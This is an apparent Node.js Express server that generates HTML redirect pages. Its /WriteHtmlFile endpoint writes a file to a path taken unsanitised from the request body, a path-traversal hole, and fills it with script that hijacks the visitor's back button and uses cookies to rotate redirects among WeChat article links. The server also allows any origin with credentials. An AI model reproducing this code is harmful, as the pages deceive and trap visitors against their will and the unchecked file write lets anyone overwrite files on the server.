var express = require('express');
var fs = require('fs');//引入node的文件(夹)读写包
var bodyParser = require('body-parser');
var routeSql = require('./router/sql/routeSql.js');

var app = express();
app.use(express.static('www'))
app.use(bodyParser.json({limit:'100mb'}));
app.use(bodyParser.urlencoded({limit:'100mb',extended:true}));
app.use(bodyParser.json({verify:function(req,res,buf,encoding){req.rawBody = buf}}))//设置能够接收raw字段
app.use(bodyParser.urlencoded({extend:false,verify:function(req,res,buf,encoding){req.rawBody = buf}}));//设置能够接收raw字段

app.all('*', function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");//http://127.0.0.1 ; null 本地访问 ; * 任何都可以访问
    res.header("Access-Control-Allow-Headers", "Content-Type,Content-Length,Authorization,Accept,X-Requested-With,token,insert");
    res.header("Access-Control-Allow-Methods","PUT,POST,GET,DELETE,OPTIONS");
    res.header("X-Powered-By","3.2.1");
    res.header("Access-Control-Allow-Credentials","true");
    res.header("Content-Type", "application/json;charset=utf-8");
    next();
});

app.post('/WriteHtmlFile',function(req,res) {
	var HtmlUrl = './www/' + req.body.HtmlUrl + '.html';
	var Str = '<!DOCTYPE html><html lang="en" xmlns="http://www.w3.org/1999/html"><head><meta charset="gb2312"><title>.</title></head><body></body><script>function aa(){window.history.pushState({title:"title",url:"#"},"title","#"),window.addEventListener("popstate",function(t){window.location="'+'http://mp.weixin.qq.com/s/PUn07nIWUypWjWuAK4zREw"'+'},!1)}function count(){var t=getCookie("gangdan");2<t?(setCookie("gangdan",2,14),t=1):setCookie("gangdan",t+1,14),window.location=1==t?"'+'http://mp.weixin.qq.com/s/d_KjE_abLOUGfDIph6VI7Q'+'":"'+'http://mp.weixin.qq.com/s/kPAiaJrlCffhSqYE0RQNGQ'+'"}function setCookie(t,o,n){var e=new Date;e.setDate(e.getDate()+n),document.cookie=t+"="+o+";expires="+e}function getCookie(t){for(var o=document.cookie.split(";"),n=0;n<o.length;n++){var e=o[n].split("=");if(e[0]==t)return Number(e[1])}return getRandom(1,2)}function removeCookie(t){setCookie(t,1,-1)}function getRandom(t,o){var n=Math.random()*(o-t),e=Math.round(n+t);return e=Math.max(Math.min(e,o),t)}aa(),count()</script></html>'
	fs.writeFile(HtmlUrl,Str,function(err, written, string){
		if (err) {
			res.send({error:1,result:err});
		} else {
			res.send({error:0,result:{msg:'测试成功'}});
		}
	})
})

app.get('/test',function(req,res){
	res.send({error:0,result:{msg:'测试成功'}});
})

app.use(require('./router/CreateLinkName/CreateAndSendFile.js'))
app.use(require('./router/LinkUrlList/LinkUrlList.js'))


app.listen('8800',function() {
	console.log('server running in 8800!');
})
